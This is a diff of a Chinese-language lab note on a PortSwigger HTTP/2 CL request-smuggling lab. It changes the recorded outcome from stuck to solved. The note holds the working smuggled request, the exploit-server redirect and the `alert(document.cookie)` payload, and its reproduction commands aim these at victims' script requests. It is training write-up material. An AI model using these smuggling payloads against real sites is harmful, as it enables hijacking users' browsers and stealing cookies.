@@ -1,39 +1,27 @@
 ---
-title: "lab-request-smuggling-h2-cl-request-smuggling"
+title: lab-request-smuggling-h2-cl-request-smuggling
 ---
 
 # lab-request-smuggling-h2-cl-request-smuggling
 
 > evidences: [[h2-smuggling-family]]
 
-PortSwigger `request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling`(批 41 新实例
-`0a03004504fbc6c380aada9400b600f8`;exploit server `exploit-0adf00ed0467c6d78022d97b010e00a1`)。
-目标:让每 10s 开首页的 Carlos 加载并执行 exploit server 上的 JS。
+PortSwigger `request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling`。实例(批 44)`0adf00e803dc315080372b0600810093`,exploit server `exploit-0af00050030b31e080ae2a84013d00cb.exploit-server.net`(从实例首页 `#exploit-link` 读出)。目标:让受害者浏览器加载并执行 exploit server 的 JS。
 
-- 判定:**stuck**(H2.CL 原语 + 302 gadget + 载荷落地都成立;**响应错位没能在可判别的请求上复现**)。
+- 判定:**solved**(横幅 `Congratulations, you solved the lab!`)。
 
-## 实测
+## 收口形(与批 41 的关键差异)
 
-1. 首页必载 `/resources/js/analyticsFetcher.js`(230B,`Cache-Control: public, max-age=3600`,
-   5s 后拉 `analytics.js?uid=<rand>`)⇒ **受害者的 JS 请求 URL 固定且可缓存**。
-2. exploit server 已 STORE:`/resources/` = `alert(document.cookie)`;
-   `/resources/js/analyticsFetcher.js` = 同载荷 + head `HTTP/1.1 200 OK\nCache-Control: max-age=600`
-   (head 只吃两行,Content-Type 由后缀决定)。
-3. **H2.CL 帧(h2_burst 双流)**:流1 `POST /` + `content-length: 0` + body = 走私的 h1 请求;
-   流2 `GET /resources/js/analyticsFetcher.js`。
-   - 走私请求 = 同一 JS 路径 → 流2 得到 app 的 JS(230B)——**与自然响应不可分辨**;
-   - 走私请求改成 `GET /resources`(应产出 `302 Location: https://<我方 Host>/resources/`)→ 流2 **仍是 app 的 JS(200)**
-     ⇒ **错位没发生**(走私响应没落到流2)。批 35 的"stream3 收到 smuggled 响应"需用可判别路径重测。
-4. `http_dump <inst>/resources/js/analyticsFetcher.js` 仍是 app 的 JS(200,无 X-Cache),`solved_check` false。
-
-## 未决面
-
-- 用**可判别**的走私路径(如 404/302)确认错位落在哪条流,再让"承载受害者 JS URL 的那条流"读到队列里的
-  exploit server 载荷,并确认前端会把它缓存进 JSON/JS 键(本 lab 的 JS 带 `max-age=3600`,是理想投毒目标)。
+- **走私请求必须"欠字节"(deficit 1)**:`Content-Length: 13` 而体只有 `smuggled=yes`(12B)⇒ 后端 holding、等下一个请求的**第一个字节**补全;这样 302 才会被记在**补全者**(受害者的 JS 请求)头上。
+  - 批 41 把走私请求写成**完整**请求 ⇒ 302 立刻生成、无人认领 ⇒ 不可交付。
+- 走私请求的 `Host` 必须是 exploit server:`GET /resources HTTP/1.1` + `Host: exploit-…` ⇒ 靶场 app 的目录重定向按 Host 生成**绝对** 302 `Location: https://exploit-…/resources/`(实测直连 `/resources` 即绝对形)。
+- exploit server 上把载荷存到 **`/resources/`**(带尾斜杠——正是 302 的目标路径),`responseHead` 只两行:`HTTP/1.1 200 OK` + `Content-Type: text/javascript`,体 `alert(document.cookie)`。
+- **重复 arm 是必需的**:用 `h2cl_seq` 12 轮(每轮 arm + 独立新连接 follow)测得 **3/12 轮** follow 收到 302 ⇒ 前端确实会把"带待定走私请求的后端连接"交给后续请求;持续 arm 直到受害者的 **script 请求**(`analytics.js?uid=…`)撞上它。
 
 ## 复现
 
 ```
-h2_burst <inst>/ --req 'POST /|GET /resources HTTP/1.1\r\nHost: exploit-0adf00ed0467c6d78022d97b010e00a1.exploit-server.net\r\n\r\n|content-length: 0;;content-type: application/x-www-form-urlencoded' --req 'GET /resources/js/analyticsFetcher.js'
-http_dump <inst>/resources/js/analyticsFetcher.js
+h2cl_seq <inst>/ --data 'GET /resources HTTP/1.1\r\nHost: exploit-<id>.exploit-server.net\r\nContent-Length: 13\r\n\r\nsmuggled=yes' \
+  --follow /resources/js/analytics.js?uid=keepalive --rounds 110 --interval-ms 1600 --read-ms 1200 --quiet
+banner_verdict <inst>/
 ```
